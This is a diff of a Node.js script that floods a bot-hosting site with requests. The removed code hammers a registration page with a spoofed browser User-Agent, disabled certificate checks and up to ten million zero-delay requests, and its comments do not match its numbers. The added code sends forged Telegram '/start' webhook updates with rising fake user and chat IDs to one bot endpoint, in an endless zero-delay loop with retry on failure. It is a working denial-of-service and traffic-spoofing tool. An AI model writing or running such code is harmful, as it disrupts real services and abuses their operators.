@@ -1,46 +1,98 @@
 const axios = require("axios");
-const https = require("https");
 
+let updateId = 8282828; // initial value
+
+let messageId = 90; // initial value
+
+let fromId = 292992929; // initial value
+
+let chatId = 828272; // initial value
 const sendRequest = async (url) => {
-  try {
-    const options = {
-      url: 'https://botsnow.tech/register.php',
-      headers: {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
-        'Accept-Language': 'en-US,en;q=0.5',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Connection': 'keep-alive'
-      },
-      maxRedirects: 0,
-      httpsAgent: new https.Agent({
-        rejectUnauthorized: false
-      })
+
+try {
+
+    updateId++; // increment update_id
+
+    messageId++; // increment message_id
+
+    fromId++; // increment from.id
+
+    chatId++; // increment chat.id
+
+    const jom = {
+
+      "update_id": updateId,
+
+      "message": {
+
+        "message_id": messageId,
+
+        "from": {
+
+          "id": fromId,
+
+          "is_bot": false,
+
+          "first_name": "soonban",
+
+          "username": "soonban",
+
+          "language_code": "en"
+
+        },
+
+        "chat": {
+
+          "id": chatId,
+
+          "first_name": "soonban",
+
+          "username": "",
+
+          "type": "private"
+
+        },
+
+        "date": new Date().getTime(),
+
+        "text": "/start",
+
+        "entities": [
+
+          {
+
+            "offset": 0,
+
+            "length": 6,
+
+            "type": "bot_command"
+
+          }]
+
+      }
+
     };
-    const response = await axios(options);
+
+    const response = await axios.post(url, jom);
+
     console.log("Request successful!");
+
     console.log(response.data);
+
   } catch (error) {
-    console.error("Request failed, retrying..."+error);
+
+    console.error("Request failed, retrying...");
+
     await sendRequest(url);
+
   }
+
 };
 
-const url = "https://botsnow.tech/register.php";
+const url = "https://botsnow.tech/v1/bots/3917/index.php";
 
-const startSendingRequests = () => {
-  let requestCount = 0;
-  const interval = setInterval(() => {
-    sendRequest(url);
-    requestCount++;
-    if (requestCount >= 10000000) { // Wait for 5 minutes (300000 milliseconds) after 20k requests
-      clearInterval(interval);
-      console.log(`Sent ${requestCount} requests, waiting for 5 minutes...`);
-      requestCount = 0;
-      setTimeout(() => {
-        startSendingRequests();
-      }, 3000000); // Wait for 5 minutes before resuming requests
-    }
-  }, 0);
-};
+setInterval(() => {
 
-startSendingRequests();
+  sendRequest(url);
+
+},0); //
